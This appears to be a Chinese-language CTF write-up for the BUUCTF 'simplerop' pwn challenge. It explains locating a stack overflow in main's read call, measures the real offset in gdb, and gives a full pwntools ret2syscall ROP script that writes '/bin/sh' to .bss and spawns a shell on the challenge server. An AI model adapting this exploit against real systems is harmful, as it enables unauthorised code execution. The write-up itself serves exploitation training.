![image-20201203104555695](https://static.hack1s.fun/images/2021/02/06/image-20201203104555695.png)

32位rop

![image-20201203104848077](https://static.hack1s.fun/images/2021/02/06/image-20201203104848077.png)

main函数中出现溢出的地方在这个read

比较奇怪的是，这里实际上在执行时v4这个缓冲区和ebp的距离并不是14h

可能是因为这个程序是静态链接的，也可能是因为要返回的是main函数

在gdb里面调试，执行到read的时候停下来

![image-20201208105650092](../../../blog/source/_posts/buuctf-pwn1/image-20201208105650092.png)

计算这时ebp和eax之间相差28；

那么实际上我们需要填充28+4字节的ebp，之后才是返回地址

利用的脚本倒是不难，是一个ret2syscall，返回到execve系统调用就可以

不过需要首先将`/bin/sh`这个字符串写在bss段，由于read直接在符号表中可以找到，可以直接调用

```python
from pwn import *

io = remote('node3.buuoj.cn',28409)
#io = process('./simplerop')
elf = ELF('./simplerop')

pop_eax_ret = 0x80bae06
pop_edx_ecx_ebx_ret = 0x806e850
int_80 = 0x80493e1

read_plt = elf.sym['read']

payload = bytes('b'*32,'ascii') + p32(read_plt) + p32(pop_edx_ecx_ebx_ret) + p32(1) + p32(elf.bss())+ p32(0x8) + p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(elf.bss()) + p32(int_80)

io.sendline(payload)
io.send('/bin/sh\x00')
io.interactive()
```

